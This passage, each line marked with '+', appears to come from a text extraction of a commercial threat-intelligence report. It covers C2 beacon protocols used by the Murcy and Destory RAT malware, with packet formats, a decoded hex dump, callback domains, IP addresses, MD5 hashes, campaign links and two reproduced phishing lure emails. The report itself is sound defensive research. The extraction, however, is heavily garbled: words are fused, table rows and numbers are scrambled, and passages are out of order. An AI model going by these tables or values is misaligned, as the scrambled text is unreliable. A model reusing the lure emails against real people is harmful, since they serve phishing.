+6
+7
+byte3rd decoded
+12
+22
+18
+21
+20
+19
+23
+byte
+FIGURE7:BITPLACEMENTFORMURCYDECODING
+some input	 data sizes a crude,	 but
+For
+functionally	equivalent,approach	istoreversethe
+inputbytes,	apply	astandard	Base64decoding,	and	
+thenreversetheoutput	bytes.
+Thedecoded	string	containscommunicationsof	a
+format	hereonreferred	toasthe‘IP2B’	protocol.	All
+observed	IP2Bcommunicationsbeganwith	a16	byte
+header
+values
+hexadecimal
+0x12345678	and	0x10001000,	and	thesizeof	the
+data.	Thedecoded	versionof	theMurcy	‘Extra­Data’
+stringfrom	Figure5is	showninFigure8.	
+
+The decoded data reveals the name of	the
+compromised	computer,that	thecomputeris	running	
+WindowsXP	ServicePack3,its	internalIP	addressis	
+192.168.132.30,
+its screen resolution is set
+to
+1920x1080and	that	its	locale33is	‘Chinese­China’.	A
+observed
+the
+in
+each	
+of
+summary	
+byte
+communicationsis	providedinTable4.
+BYTE	POSITION
+SIZE	
+DESCRIPTION*
+(BYTES)
+Protocolidentifier.‘0x12345678’in
+0
+4
+allobserved	communications.
+4
+4
+Hexadecimalvalue	0x10001000in
+allobserved	communications.
+2
+8
+Datasizeinbytes	(excluding	
+header).
+Datasizeinbytes	(excluding	
+10
+2
+header).
+‘0x00’	inallobserved
+4
+12
+communications.
+’0x180x090x070x20’	inall
+16
+4
+observedcommunications.
+IP	address.Valueisbig­endian.
+4
+20
+24
+4
+IP	address.Valueisbig­endian.
+28
+4
+Unknown.
+Unknown.
+4
+32
+36
+4
+Horizontal	screenresolution
+(pixels).
+40
+4
+Vertical	screenresolution(pixels).
+Localeidentifier34.
+4
+44
+48
+4
+Tick	count.Valueis	identical	tothat
+presentintheURIwithintheMurcy
+HTTPGETrequests.
+OSmajorversion.
+4
+52
+56
+4
+OSminorversion.
+60
+4
+OSbuildnumber.
+PlatformID.
+4
+64
+68
+24
+Unknown.
+92
+SizeIdent
+Ident­Anullterminated	2­bytewide
+characteridentifierstring.
+SPack	­Anull­terminated	2­byte
+SizeSPack
+[92+	SizeIdent]
+widecharacterstring	indicating	the
+latestServicePack	installed.	
+[92+	SizeIdent+	
+SizeUName
+UName­Anullterminated	2­byte
+widecharacterusername.
+SizeSPack]
+SizeCName
+[92+	SizeIdent+	
+CName–Anull­terminated	2­byte
+SizeSPack+	
+wideUnicodecharactercomputer
+name.
+SizeCName]
+*ALL	VALUES	ARE	LITTLE­ENDIAN	UNLESS	OTHERWISE	STATED.
+TABLE4:IP2BPROTOCOLFORMAT
+																																																																			
+33A locale is a collection of language­related user preference
+informationthattypicallyidentifies	auser’s	countryand	dialect.
+(MicrosoftCorporation,2011)
+34For a list oflocaleidentifiers	refertotheMicrosoftMSDN
+referencepage.(MicrosoftCorporation,2011)
+COPYRIGHT©	COMMANDFIVEPTY	LTD.ALLRIGHTSRESERVED.
+
+containing	
+
+78 56 34 12  00 10 00 10  DA 00 DA 00 ; xV4.........
+00 00 00 00  18 09 07 20  C0 A8 84 82 ; ....... ....
+C0 A8 84 82  F0 FD 07 00  54 0D 00 00 ; ........T...
+80 07 00 00  38 04 00 00  04 08 00 00 ; ....8.......
+2C 4D 02 00  05 00 00 00  01 00 00 00 ; ,M..........
+28 0A 00 00  02 00 00 00  4C 00 00 00 ; (.......L...
+8A 00 00 00  A8 00 00 00  AA 00 00 00 ; ............
+B8 00 00 00  D8 00 00 00  38 00 33 00 ; ........8.3.
+37 00 42 00  xx xx xx xx  xx xx xx xx ; 7.B.xxxxxxxx
+xx xx xx xx  xx xx xx xx  xx xx xx xx ; xxxxxxxxxxxx
+xx xx xx xx  xx xx xx xx  xx xx xx xx ; xxxxxxxxxxxx
+xx xx xx xx  xx xx xx xx  xx xx xx xx ; xxxxxxxxxxxx
+xx xx 36 00  39 00 31 00  00 00 53 00 ; xx6.9.1...S.
+65 00 72 00  76 00 69 00  63 00 65 00 ; e.r.v.i.c.e.
+20 00 50 00  61 00 63 00  6B 00 20 00 ;  .P.a.c.k. .
+33 00 00 00  00 00 53 00  59 00 53 00 ; 3.....S.Y.S.
+54 00 45 00  4D 00 00 00  57 00 4F 00 ; T.E.M...W.O.
+57 00 2D 00  45 00 38 00  45 00 xx xx ; W.-.E.8.E.xx
+xx xx xx xx  xx xx xx xx  xx xx xx xx ; xxxxxxxxxxxx
+36 00 00 00  00 00                    ; 6.....      
+
+FIGURE 8: EXAMPLE OF DECODED MURCY DATA
+STRING
+
+PAGE8OF	29
+
+IP2B Protocol
+
+the
+
+THE ‘OSCAR’ PROTOCOL
+
+data was
+
+THE ‘BB’ PROTOCOL
+
+Thedatasent	to	theC2	serveris	dependent	on
+theC2instructionsreceived.	Commands	theMurcy
+malwarereportedly	understands	areshowninAnnex
+D.	(SafeZoneCast,	2011)
+The Murcy malware
+is	 commonly	 named
+‘cydll.dll’,	creates a mutual exclusion (mutex35)	
+handlenamed	‘Cy1.0Mutex’,	and	installsaservice
+named‘CyService’with	adisplay	nameof	‘CyService
+Service’.	It	also	commonly	gains persistence by
+registry
+creating	
+key	
+‘ServiceDll
+=	
+the
+%System%\cydll.com’inthe‘ControlSet001’keyin
+theLocalMachinehiveoftheWindowsregistry.	
+discovered
+Corporation
+Symantec
+Backdoor.Murcy on 31	July	2011,	yet	the same
+malware appears to	have been first	detected	by
+Kaspersky	Lab on 11 January	201036.	Malware
+sampleswith	thesameattributesdatebackto	at	least	
+October 200937.	 This	 suggests that
+the Murcy	
+malwarehasbeeninuseforat	least	two	years.
+Known Murcy	 malware uses
+the callback
+,	
+domains
+‘albertstein.ddns.us’
+‘alvington.jetos.com’39,	‘ftp.xmahone.ocry.com’40,	and
+38
+‘superaround.ns02.biz’41.	These callback domains
+wereallalso	reportedly	used	intheMarch	2011
+intrusionintoRSA’snetwork.	Thatintrusionresulted
+inthetheft	of	informationrelated	to	RSA’sSecurID
+authentication products.	 The
+two­factor
+stolen
+informationwaslaterused	to	enabletargeting	of	
+defence contractors. (Coviello,	2011).	(Rasmussen,
+2011)(US­CERT,	2011).	
+																																																																			
+35Amutexisatechnical	constructused	tocontrolaccesstosystem
+resources.Inthis	casethetechnicalmeaning	is	lesssignificantthan
+thefactthatthemutexintheMurcymalwareis	uniquelynamed.
+36Malwarethatfits	theprofileofMurcymalwarewas	detected	on
+11January2010as	‘Backdoor.Win32.Agent.anvj’.(KasperskyLab
+ZAO,2010)
+37Malwaredetected	in2009withtheMD5	hashes‘3FDEA18B
+9610CBC9B63B	A7A44899FBFB’and	‘42E8163B7F08DD38
+3E62 E4BD B7F0 7C08’	is known to callback	to IP address
+203.160.67.130.(Sunbelt,2009)(SunbeltSecurity,2009)
+38MalwarewiththeMD5	hashes‘19B0	227B	EC75BEF9	3C6C
+CC549B6D2BA0’	and	‘3DF0D0AB	4AD9	DA4559A1	C646	4C85
+26D1’	callback	tothedomain‘albertstein.ddns.us’.(GFISoftware,
+2010)(Sandbox,2010)
+39Malwarewith	theMD5hashes	‘91A2	68B317D2	CC65	69B8
+5BB0	3A5F	F841’	and	‘69ED8F7B	0046956045A9	0E36	E3C8
+3F6A’	callback	to the domain ‘www.alvington.JetOS.com’. (GFI
+SandBox,2011)(SunbeltSecurity,2010)
+40MalwarewiththeMD5hashes	‘0D38D6C2B9EB817B40AF
+C4272545A43B’,‘3E3736DFFEDAF2A0AE4D948567933B3F’
+and	‘9ADDC6D5	7330	9399	E2B8	7887	3A00A921’	callbacktothe
+domain‘ftp.xmahone.ocry.com’.(GFISandbox,2011)(Telus,2011)
+(ThreatExpertLtd,2011)(GFISandbox,2011)
+41Malwarewith	MD5	hash‘3740	5D5B	CF64FB95	47CACDA9
+5F4CE8B4’is	knowntocallbackto‘www.superaround.ns02.biz’.
+(GFISandbox,2010)
+
+Numerouscomputerswereobserved	communicating
+with	an‘alyac.org’subdomainonTCP	port	80	viathe
+‘Oscar’protocol.Most,but	notall,	ofthecomputers
+also	communicated to the same domain via the
+‘Update?’communications.	Theprotocolis	believed	
+to	 be associated	 with	 the same malware that
+producesthe‘Update?’communications–theDestory
+RAT.Each	compromisedcomputercommunicated	at	a
+different	intervalto	theothers,	and	accordingly,	the
+malware on each	of	the compromised	computers
+appearstohavebeenindividually	configured.	For
+example,	one computer communicated every 12
+seconds	and	anotherevery	16	seconds.
+during
+Encrypted
+each	
+sent
+communication.Thelengthof	theencrypteddatain
+each	packet	varied	between16	bytesand89	bytes.	
+Aftersending	theencrypted	datathemalwarewaited	
+foraresponse.	
+Twocomputerswereobservedcommunicatingwith
+‘update.alyac.org’viathe‘BB’protocol.	Oneof	the
+computersused	aChineseIP	address,	theothera
+South	KoreanIP	address.	The‘BB’protocolhasa21
+byteheadercontaining	a4byteXORkeythat	canbe
+usedtodecodetheremaining	bytesinthepacket.The
+packet	format	isdescribed	inTable5.
+BYTE	
+DESCRIPTION*
+SIZE	
+(BYTES)
+POSITION
+SizeBB­Sizeinbytes	(including	
+0
+4
+header).
+Possiblecommunicationtype
+4
+4
+indicator.‘0x010x000x000x00’inall
+observedcommunications.
+Victimspecificbytes.
+8
+4
+XORkey.
+12
+4
+16
+Unknown.‘0x010x040x010x00’inall
+4
+observedcommunications.
+Unknown.’0x00’inallobserved	
+20
+1
+communications.
+21
+Dataencoded	using	the4	byteXORkey
+[SizeBB]
+specified	inbytes	12­15.
+*ALL	VALUES	ARE	LITTLE­ENDIAN	UNLESS	OTHERWISE	STATED.
+TABLE5:'BB'PROTOCOLPACKETFORMAT
+Oncedecoded,	thedatarevealsabasicbeacon
+containingthecomputernameandIPaddressof	the
+infectedcomputer.	
+COPYRIGHT©	COMMANDFIVEPTY	LTD.ALLRIGHTSRESERVED.
+
+PAGE9OF	29
+
+THE ‘DB’ PROTOCOL
+
+about	
+
+Aftersending	thebasicbeacon,	thecompromised
+computerswaitedforaresponsefromtheserver,	
+then closed the connection when they had	not
+received	a response from the server within five
+seconds.Both	ofthecompromised	computersreattempted
+the communications approximately	 every	 eight
+seconds.Onsomedaysthehighfrequency	of	the
+beaconactivityresultedinover10000connection
+attemptspervictimina24	hourperiod.
+Asinglecomputerwasobserved	communicating	with
+thedomain‘update.alyac.org’viathe‘DB’protocol.	
+The communications originated from the same
+Chinesecomputernetworkasoneof	the‘BB’victims
+but	fromadifferent	computeronthat	network.	It	is
+not known what	 malware generates
+the ‘DB’
+communications,	orwhetheritisthesamemalware
+that	generatesthe‘BB’communications.
+The communications reveal detailed	OS and
+system	
+compromised
+the
+information
+computerasshowninTable6.	TheOSinformation
+revealsthat	thecompromised	computeris	running
+Windows2003ServerServicePack2.Thedetailed
+system	information revealsthat	thecompromised
+computerhasanIntelPentium	Pro­classprocessor,
+four logical processors and	an LGA 77542Central
+Processing	Unit	(CPU)socket.
+DESCRIPTION
+BYTE	
+POSITION43
+0
+OSVERSIONINFOEXstructure(format
+showninAnnexA).
+156
+SYSTEM_INFOstructure(formatshownin
+AnnexB).
+192
+Computername.
+TABLE6:SUMMARYOFFIRST202BYTESOFA‘DB’
+PACKETThe DB communications typically	occurred	at
+intervalsof	between4	and	92	seconds,however,
+sometimes they were much	further apart. After
+sending	thedetailedbeaconto	thecommand	and
+controlserver,	thecompromisedcomputerappeared
+to	expect	aresponsefromtheserver.	
+																																																																			
+42 The
+revision
+level
+informationindicatesthecomputerhas	anLGA775	CPUsocket
+(Intel	family6/model	15/stepping	11).(MicrosoftCorporation,
+2011)(Wikipedia)
+43Onseveraloccasionsthe4bytes	‘70170000’	wereprepended
+tothecommunications.
+
+combined processor
+
+SIZE	
+(BYTES)
+156
+36
+10
+
+and processor
+
+these
+
+THE ‘QDIGIT’ PROTOCOL
+
+FREQUENCY OF	COMMUNICATIONS
+
+is	 assumed	
+
+OnecomputerusingastaticSouthKoreanIPaddress
+wasobserved	sending	thefivebytes0x510x31	0x39	
+0x21	0x00	(“\x51Q19!”)	to	‘update.alyac.org’onTCP
+port	80	up	to	nearly	800timesaday.	Whilethe
+communicationsdid	not	occur	continuously	(likely
+dueto	thecomputerbeingturned	off),	whentheydid
+occur	a new	connection was attempted, and	the
+packet	containing	‘Q19!’sent,	approximately	every
+minute.	
+It	
+communications
+are
+generated by	malware but it	is	not	known what	
+malware,	or which	other callback domains that	
+malwareuses.Themalwareappeared	toexpect	a
+responsefrom	theserverafterit	senteach	packet.
+to ‘alyac.org’
+The communications
+subdomains
+compromised
+from	 each	
+frequently	
+occurred	
+computer.Asummary	oftypicalobserved	intervals
+betweencommunications,	brokendownby	protocol,
+is	showninTable7.	
+TYPICAL	BEACON	INTERVAL*
+PROTOCOL
+(SECONDS)
+LURK
+26
+36
+X­ShellC601
+Update?
+1	to13,12±3,16,104±3or200	±15
+11
+Murcy
+12±2,13,15,16,(55or155±5),(7.5,	8.5or15),
+Oscar
+(45,55,	106)
+BB
+8
+4	to92
+DB
+Qdigit
+60
+*Commas	indicatethattheinterval	changed	betweenvictims.
+Brackets	indicatethatavarietyofintervalswereobserved	from
+asinglecomputer.
+TABLE7:INTERVALBETWEENCOMMUNICATIONS
+ThesingleLURK	victim	wastypically	observed
+beaconingat	26second	intervals,	theMurcy	victimat	
+11	second intervals,	and the Qdigit victim at 60
+second	intervals.	Allof	theX­ShellC601	victims	were
+typically	observedbeaconing	at	36second	intervals,	
+and	the BB victims	at	8 second	intervals.	The
+beaconing interval of the other victims	does not
+appearto	beafixed	time,	and	instead	adegreeof
+randomnessappearstobeemployed.
+
+COPYRIGHT©	COMMANDFIVEPTY	LTD.ALLRIGHTSRESERVED.
+
+PAGE10OF	29
+
+Ports used
+
+ASSOCIATION WITH	MALWARE AND ATTACKS
+
+PORT
+80
+443
+80
+80
+80
+80
+80
+80
+
+AsshowninTable8,	theobservedcommunications
+alloccurred	onTCP	port	80orTCP	port443	­ports
+commonly	used	forlegitimatepurposes44.	
+PROTOCOL
+LURK
+X­ShellC601
+Update?
+Murcy
+Oscar
+BB
+DB
+Qdigit
+TABLE8:COMMUNICATIONPORTSUSED
+While most	malware uses the local DNS	server
+settingsofthecompromised	computertoresolveits
+callbackdomainto	anIP	address,	insomeobserved
+communications
+to	 have
+the attackers appear
+specifically	chosentheDNS	servers.	
+ThemajorityofX­ShellC601	malwarethatcalled	
+back to	‘path.alyac.org’ used	Google DNS servers,	
+presumably	instead	of
+the DNS settings on the
+compromised	computers.	TheX­ShellC601	malware
+supportsuseof	aspecified	DNS	serverto	resolve
+callbackdomains,	and	it	appearstheattackershave
+madeuseof	thisfunctionality.	
+The‘Update?’,	Oscar,	Murcyand	Qdigit	victims	all
+appearto	haveused	theirlocalDNS	serversettingsto
+resolvethecallbackdomains.	Ontheotherhand,	the
+single LURK victim	used	Google DNS	servers to
+resolveits	callbackdomain,	asdidtheChineseBB
+victim	(and	associated	DBvictim)	but	not	theSouth
+KoreanBBvictim.	This	suggeststhat	theLURK,	BB
+and	DB malware may	also	have the same DNS
+functionality	asX­Shell,	althoughit	is	possiblethat
+thevictimsareconfiguredto	usetheGoogleservers
+astheirregularDNS	servers,	and	that	themalwareis	
+not	using	different	servers.
+																																																																			
+44TCPports	80	and	443arecommonly	used	forlegitimateHTTP
+and	HTTPSactivityrespectively,and	as	such	communications	to
+theseports	areoftenallowedthrough	firewalls.
+
+Theobservedcommunicationshavelinkstoavariety
+of	malwareand	to	anumberof	attacks,	asillustrated	
+inFigure9,	and	detailedbelow.	
+The ‘Update?’ communications and	the Oscar
+communicationsarebothassociated	withtheDestory
+RAT	familyofmalware.Thismalwarefamily	hasbeen
+used	inanumberof	targeted	attacksincluding	the
+July	2011	SKCommunicationshack.	Throughshared
+infrastructurethemalwarehaslinkstotheseriesof
+coordinated,	 covert	 and	 targeted	 cyber attacks
+dubbed	‘NightDragon’45,	and	also	to	therecent	series
+of	 targeted attacks that	 have used	
+‘Sykipot’46
+malware.	
+Throughashared	callbackdomaintheDestory
+RAT	malwarealso	haslinksto	socially	engineered
+emailsincluding	thosethattargeted	expertsonthe
+relationship	of	theUnited	Stateswith	Japan,	China
+and	Taiwan.TheDestoryRAT	isalso	connectedto
+LURK	malware via a compromised	code signing
+certificatewhich	wasusedto	signboth	piecesof
+malware,andtoIP2Bcommunicationsby	ashared
+callbackdomain.
+The X­ShellRAT has been used in numerous
+attacksbut	many	of	theseattacksarenot	expected	to
+beassociated	with	thesameattackers.Ontheother
+hand,	thecallbackdomainsused	byMurcymalware
+suggest	that	themalwareisused,	perhaps	solely,	by
+theattackersresponsiblefortheMarch2011RSA
+breach.
+IP	 addresses,	 to	 which ‘alyac.org’ and its
+the
+subdomains previously	 pointed,	 associate
+domain,andtheattackersbehindit,witharaft	of
+activity.	This	includes activity	involving	callback
+domainsregistered	toappearasthoughthey	were
+associated	 with legitimate,	 trusted	 entities,	 and	
+domainsregistered	to	a‘LeeCooper’that	tiebackto
+theSKCommunicationshack.
+																																																																			
+45The NightDragon series of attacks	began in, or prior to,
+November 2009 and targeted global	oil and petrochemical
+companies.(McAfeeFoundationProfessionalServices	andMcAfee
+Labs,2011)
+46Sykipot is a family	of malware used since 2007 to steal
+intellectualproperty.Themalwarehasbeenusedinaseriesof
+sociallyengineered	emailcampaigns	againstavarietyofsectors.
+Onanumberofoccasions,theattackershaveexploitedzeroday
+vulnerabilities	to install
+the
+the malware. Some variants	of
+malware include features	that enable	it to hijack	smartcards.
+(Thakur,2011)(Lelli,2010)(Blasco,2012)
+COPYRIGHT©	COMMANDFIVEPTY	LTD.ALLRIGHTSRESERVED.
+
+NAME	SERVERS
+
+PAGE11OF	29
+
+SK	
+Communications
+hack
+
+*.duamlive.com
+Poison
+*.network­
+IvyRAT
+sec.net
+
+Targeted	emails
+pu.flower­show.org
+112.121.171.94
+www.mailsignin.net
+*.mail­
+ru2.com
+*.oerco.com
+67.90.204.228
+*.todaygonever.
+com
+Financial	IP	
+address
+*.welldone
+123.net
+
+www.adv138mail.com
+newhose.ntimobile.com
+sms.servegame.com
+*.join3com.com
+NightDragon
+*.bluelightness.com
+67.79.149.90
+
+‘Janagreen2000’
+
+175.45.22.220
+‘madconnon
+@126.com’
+*.afbjz.com
+209.133.72.83
+*.filesdelete.com
+*.greenright
+way.com
+
+*.newcarstyle
+.com
+
+Sykipot
+
+FIGURE9:ILLUSTRATIONOFLINKS
+
+Several	targeted	
+attacks
+
+202.30.224.240
+
+Compromisedcode
+signing	certificate
+(6724340ddbc7252f7fb
+714b812a5c04d)
+Destory
+RAT Update?
+Oscar
+protocol
+communications
+BB	malware
+BB	protocol
+
+*.mail­kr2.com
+12.68.249.62
+*.world
+securitys.com
+68.178.232.100
+209.53.155.244
+
+Alyac.org
+and	its	
+subdomains
+X­ShellC601
+communications
+X­Shell
+RAT
+Several	
+attacks
+IP2B	
+protocol
+COPYRIGHT©	COMMANDFIVEPTY	LTD.ALLRIGHTSRESERVED.
+
+IP2B	
+malware
+wow.travlman.com
+203.160.67.131
+PAGE12OF	29
+
+*.topix21
+century.com
+
+ro.diggfunny.com
+bbs.ezxsoft.com
+
+‘LeeCooper’
+Trojan.Win32.
+AgentBypass
+
+LURK	
+malware
+TheLURK	
+protocol
+222.122.20.241
+Qdigit
+communications
+DB	protocol
+Murcy
+malware
+
+*.windowupdate.org
+
+pc.nprotects
+.org
+Qdigit
+malware
+DB	malware
+
+Unique
+directory
+(03a075fb70d5d6
+75f9dc26fc)
+Trojan.Win32.Generic
+(tcomoniter.exe)
+Several	
+attacks
+ftp.xmahone
+.ocry.com
+
+superaround
+.ns02.biz
+
+RSABreach
+
+alvington
+.jetos.com
+
+albertstein
+.ddns.us
+
+NightDragon
+
+Socially	Engineered Emails
+
+named	
+to
+the
+
+Destory	RATmalwareisknowntocommunicatewith
+thecallbackdomain‘vupdate.mail­kr2.com’47,	while
+NightDragonmalwareis	knownto	communicatewith
+‘ma2.mail­kr2.com’48and ‘www2.mail­kr2.com’49.	
+The communications sent to	‘www2.mail­kr2.com’
+similar 50,	 but	 not
+IP2B
+identical,	
+to	
+are
+communications,	
+observed
+further
+linking
+the
+activity.	Other ‘mail­kr2.com’ subdomains include
+‘sa****.mail­kr2.com’,	
+‘cb85.mail­kr.com’,	
+and
+‘skylie.mail­kr2.com’	­ at	least	two of	which	are
+knowntobeassociatedwithmalware51.
+Destory	RAT	malware is known to	use the
+callback domain ‘bbs.afbjz.com’52,	 while known
+NightDragon malware uses the callback domain
+‘blog.afbjz.com’53.	Asof	3	February	2012,bothofthe
+subdomainspoint	toUSIPaddress67.90.204.228.
+This	overlap in infrastructure appears to be of
+particular significance given the following	
+links
+betweenotheractivityonthesameIPaddress.	
+Asof	6February2012,thedomains‘gmail.mail­
+ru2.com’,	
+‘mail­ru2.com’,
+‘live.mail­ru2.com’,	
+‘usaisbig.oerco.com’,
+‘msn.mail­ru2.com’,
+‘www.afbjz.com’,	
+‘whois.oerco.com’,	
+and
+‘www2.oerco.com’
+IP
+address
+to
+also	 point
+67.90.204.228.	At	least	one of	these domains is	
+otherwiseknowntobeassociated	with	malware54.	
+																																																																			
+47TheDestoryRATwith	MD5	hash‘95558985D211	F768	1ACC
+1AC9	 2DCB	 07C8	 A096	 B403’ uses	 the callback	
+location
+‘vupdate.mail­kr2.com’.
+48MalwarewithMD5	hash	‘2D8A9038E151FB30D45EA866
+8AFD	2A8E’,knowntocallback	to‘ma2.mail­kr2.com’,is	detected
+byantivirus	softwareas	‘TrojanDropper:Win32.RedSip.A’,analias
+forNightDragonmalware.(ThreatExpertLtd.,2010) (Hispasec
+Sistemas,2011)(Kurc,2011)
+49MalwarewithMD5hash‘5BC597E48270F04EC9B68343
+2432 E352’, known to call back	to ‘www2.mail­kr2.com’,
+is
+detected	byantivirussoftwareas	‘Backdoor:Win32/RedSip.A!svc’,
+an alias	for NightDragon malware. (Sunbelt Security, 2010)
+(HispasecSistemas,2010)
+50Both	communications	beginwith	a16byteheadercontaining	the
+protocolidentifier‘0x12345678’	and	adatasize,and	thedatain
+both	contains	similarsysteminformationbutinadifferentorder.
+51Maliciousfiles	areseparately	knowntoattemptcommunications
+with‘sa*****.mail­kr2.com’	onTCP	port8000,and	‘cb85.mail­
+kr2.com’	onTCP	port6543.	(DoctorWeb,2011)(SunbeltSecurity,
+2011)
+52The domain ‘bbs.afbjz.com’	is a known callback domain of
+DestoryRATmalwarethatis	detected	byantivirussoftwareas
+both	Backdoor:Win32/Thoper.Aand	Backdoor.Sogu.(Wong,	2011)
+(Mullaney,2011)
+53The domain ‘blog.afbjz.com’	is	a known callback	domain of
+NightDragonmalwarethatisdetectedbyantivirussoftwareas
+‘Trojan.Dropper:Win32/Redsip.A’.(Kurc,2011)
+54 Malware
+software
+that
+as
+antivirus	
+with
+‘Trojan.DownLoader4.8565’
+communicates	
+us****ig.oerco.comonTCPport100.(Dr.Web,2011)
+PAGE13OF	29
+COPYRIGHT©	COMMANDFIVEPTY	LTD.ALLRIGHTSRESERVED.
+
+The‘oerco.com’domainis	registered	to	thesame
+personas‘afbjz.com’55,	associating	thetwodomains
+with	a single entity.	The ‘mail­ru2.com’ domain
+appearsto	beassociated	with	thesameentity	asthe
+‘mail­kr2.com’domainusedby	NightDragonmalware
+and	theDestroyRAT	(asdescribed	above).	Whilethe
+domainswereregisteredusing	different	details,	they	
+wereregistered	onthesameday	through	thesame
+domainnameregistrar,	and	therecords	laterupdated
+minutesapart56.	This	suggeststhat	allC2	activity	
+involving	
+67.90.204.228	 may	 be
+IP	 address
+associated	withasingleentity.	
+Therecently	expired	domain‘todaygonever.com’
+also	previously	pointed	to	thesameIP	address.	As
+discussed
+will
+paper,
+be
+later
+in
+the
+is	 directly	 associated with	
+‘todaygonever.com’
+malwareand	haslinksto	therecent	seriesof	Sykipot
+recently
+expired	
+attacks.	
+domains
+The
+‘deadlinely.com’
+‘goodfeelingauto.com’
+also	
+and
+pointed	to	the same IP	address and	were likely
+associated	withthesameattackers.
+Other Destory	 RAT	 callback domains are also	
+otherwiselinkedtomaliciousactivity.	Forexample,	
+the callback domain 'www.adv138mail.com'57was
+used	by	a Poison Ivy	RAT58sent	in a July	2011	
+socially	engineered	email campaign. The emails
+an
+contained	
+‘Meeting
+attachment,	
+Agenda.pdf’,	 which	
+exploit	
+a
+attempted	
+Common
+by	
+specified
+vulnerability	
+Vulnerabilitiesand	Exposure(CVE)number2010­
+288359to	installthePoisonIvyRAT.	Acleandecoy	
+PDFfilewasshowntotheuserwhentheattachment
+wasopened.Acopy	of	thetext	usedinthesocially	
+engineered	emailcampaignisshowninFigure1060.	
+																																																																			
+55Both	domains	areregisteredtoapersonwhosecontactemail
+addressis	‘madconnon@126.com’.Thenameand	addressdetails
+areidenticalforboth	domainregistrations.
+56Thedomain‘mail­kr2.com’	was	lastmodified	on24February
+2012 at 1:40:32, while	the domain ‘mail­ru2.com’	was	last
+modified on the same day at 1:43:53. Both	domains were
+registered	through	35	Technology	Co.,Ltdon8March	2010.
+57Thedomain‘www.adv138mail.com’	is	listed	as	aBackdoor.Sogu
+callback.(Mullaney,2011)
+58ThePoisonIvyRATis	anadvanced	remoteadministrationtool
+forWindows.Both	freeand	paid	versionsoftheRATareavailable.
+(shapelessn.d.)
+59CVE2010­2883refers	toaparticularvulnerabilityincertain
+versions	ofAdobeReaderand	Acrobatwhichanattackercanuseto
+take	control	ofaffected	Windows,Macintosh	and	UNIXsystems.
+(AdobeSystemsIncorporated	2010)
+60Email	courtesyofMila	Parkourof‘contagiodump.blogspot.com’.
+(Parkour2011)
+
+is	 detected by
+
+Dear <recipient>,
+
+Dear Sir/Madam,
+
+will
+
+be
+
+its Implications for
+
+The Sasakawa Peace Foundation would like
+to extend to you an invitation to be our
+guest speaker at the America’s Strategic
+Restraint and
+the
+U.S.- Japan Alliance.
+As you know, the Sasakawa Peace Foundation
+is interested in the U.S.- Japan Alliance
+Since you are familiar with the field, we
+know
+extremely
+views
+interesting to us.
+please find enclosed further details, we
+would appreciate having
+acceptance
+soon so we may complete our agenda.
+
+your
+
+your
+
+�
+�
+�
+�
+�
+
+Best wishes,
+<purported sender>
+
+FIGURE10:TEXTOFASOCIALLYENGINEERED
+EMAILASSOCIATEDWITHWWW.ADV138MAIL.COM
+The domain ‘www.adv138mail.com’
+is	 also	
+associated	 with	 malware detected	 by	 antivirus
+software as ‘Backdoor.Win32.Delf.abow’61.	 Other
+knownsubdomainsinclude:
+‘asm.adv138mail.com’,
+‘dns.adv138mail.com’,
+‘ftp.adv138mail.com’,
+‘ihi.adv138mail.com’62,
+‘nov.adv138mail.com’.	
+Thesedomains(withthepossibleexceptionof
+the‘dns’and‘ihi’subdomains)haveallpointedtothe
+same infrastructure63as the domains ‘pu.flower­
+show.org’ and	
+‘www.mailsignin.net’.	 That	shared
+infrastructureis	knownto	havebeenused	tosend
+socially	 engineered emails
+that	 contained	 an
+attachment	named	‘invtation.pdf’[sic].	Similarto	the
+‘Meeting	Agenda’ attachment,	‘invtation’
+installs a
+PoisonIvy	RAT,	butoneconfiguredtocommunicate
+with	thecallbackdomain‘pu.flower­show.org’64.	The
+textusedintheemailsis	showninFigure1165.	
+																																																																			
+61ThemalwarewithMD5hash‘F0B8	48A8	41D4EF3406A6	F9C4
+766C	540B’modifies	the‘hosts’fileoncomputers	itisrunonso
+that
+the file contains	 an entry for ‘www.adv138mail.com’.
+(ThreatExpertLtd.,2011)
+‘ihi.adv138mail.com’	
+62 The
+listed	
+as	
+a
+domain
+Backdoor:Win32/Thoper.Acallback	location.(Wong,	2011)
+63Thedomains	previouslypointed	toaC2	serverlocated	atIP
+address112.121.171.94.
+64The socially engineered	email that communicated back	to
+‘pu.flower­show.org’	was	sentfromIP	address112.121.171.94–
+thesameIP	addresstowhich	thecallbackdomainpointed.	
+65Email	courtesyofMila	Parkourof‘contagiodump.blogspot.com’.
+(Parkour,contagio:Jul5	CVE­2010­2883PDF	invitation.pdfwith
+PoisonIvyfrom112.121.171.94|	pu.flower­show.org,2011)
+
+is	
+
+I’m greatly honored to invite you to the
+seminar about technology, which will be
+held on 28th,July.We would appreciate it
+if you would take your spare time to
+share the occasion with us. The detail
+information is in the attachment. Please
+confirm
+your
+earlist convenience. Looking forward to
+your reply.Thanks very much.
+
+participation
+
+your
+
+at
+
+Additional Destory	RAT Links
+
+Best Regards,
+<purported sender>
+
+FIGURE11:TEXTOFASOCIALLYENGINEERED
+EMAILSENTFROMIPADDRESS112.121.171.94
+In	
+addition
+previously	
+shared
+to
+having	
+infrastructurewiththeknownDestoryRATcallback
+‘www.adv138mail.com’,	
+domain
+domain
+the
+‘www.mailsignin.net’ has also	 previously	 shared
+infrastructurewith	at	least	twootherknownDestory
+The
+RAT	
+callback
+domains.	
+domain
+‘www.mailsignin.net’ previously	 pointed	
+IP
+to	
+address175.45.22.220,	asdid	theknownDestory
+RAT	callbackdomains‘newhose.ntimobile.com’and
+‘sms.servegame.com’66.	Anumberof	subdomainsof	
+theDestory	RAT­associated	domain‘join3com.com’
+also	previously	pointed	tothesameIPaddress67.	
+Theselinkssuggestthat	many	attacksinwhich
+theDestory	RAT	hasbeenused	arelinked,	not	only	
+by	themalware,but	also	throughC2infrastructure.
+This	furthersupportsthenotionthattheDestory	
+RAT	wasdevelopedby,	orfor,particularattackers
+and	that	most,	ifnot	all,	of	themaliciousactivity
+involvingit	is	attributabletothoseattackers.
+TheDestorycallbackdomainsalso	havelinksto
+the domain
+additional malware.	 For example,	
+‘network­sec.net’hasbeenused	by	theDestory	RAT
+(‘gm1.network­sec.net’),	 by	 Poison Ivy malware
+‘Backdoor­FCQ’
+(‘yoyo.network­sec.net’68) and	by	
+																																																																			
+66Thedomains‘newhose.ntimobile.com’and‘sms.servegame.com’
+arelistedasknowncallbacksforBackdoor.SoguandThoper.A
+respectively.(Wong,	2011)(Mullaney,2011)
+‘123.join3com.com’,
+67 The
+subdomains
